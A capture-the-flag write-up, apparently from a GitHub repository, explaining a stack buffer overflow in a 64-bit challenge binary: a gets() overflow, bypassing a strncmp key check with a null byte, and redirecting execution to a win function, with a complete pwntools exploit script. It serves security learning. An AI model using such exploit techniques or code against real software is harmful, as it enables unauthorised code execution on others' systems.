# Intro
This chall use basic Buffer Overflow attack in 64-bit file exec. You can donwload the file at [file](https://github.com/Langhere/WriteUpCTFlocal/blob/main/cyberkarta/cyberkarta_bufferoverflow)

# Analysis & Debug
checkec file for see protector

<img width="392" alt="image" src="https://github.com/Langhere/WriteUpCTFlocal/assets/142018203/4ac9b331-d400-41cd-9e5f-5dcf2c074f64">

for dynamic analysis i using ghidra, cuz not source code for this chall
so let's see main func

<img width="949" alt="image" src="https://github.com/Langhere/WriteUpCTFlocal/assets/142018203/9e09cdd8-d7d6-43ca-8fd5-a2138aaa4f4c">

There is nothing interesting or exploitable here, so i check cyberkata_entry

<img width="951" alt="image" src="https://github.com/Langhere/WriteUpCTFlocal/assets/142018203/0a0f218b-cf9c-4f24-94f5-0ee44f4f4b91">

so the vuln at `gets()` you can overflow that, but the problem is function `strncmp`, you can pass this func using a correct key.
So how to exploit ? Read [this](https://stackoverflow.com/questions/24353504/whats-wrong-with-strcmp) blog for more insight. Uses `strncmp` 
to protect against non-null-terminated strings, so after you add \0 you can overwrite anything in return address.
The return addres for win in the challenges is 

<img width="954" alt="image" src="https://github.com/Langhere/WriteUpCTFlocal/assets/142018203/1da0189e-266f-4afd-a13f-4480dbda5834">


# Chain you need for exploit
- key
- padding - key
- ret address

# My exploit script
```
from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())


# Set up pwntools for the correct architecture
exe = './cyberkarta_bufferoverflow'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = start()

# How many bytes to the instruction pointer (EIP)?
#padding = 24


payload = flat(
    b'CodingInAssemblyIsFun\0',
    b'A' * 242,
    p64(0x000000000040101a),
    p64(0x00000000004012fa),  
)

# Save the payload to file
write('payload', payload)

# Send the payload

io.sendline(payload)

# Receive the flag
io.interactive()
```
Result

<img width="955" alt="image" src="https://github.com/Langhere/WriteUpCTFlocal/assets/142018203/6555b1c1-70fe-400b-a7ac-e46f01c7b49a">

has ben pwned!!🗿
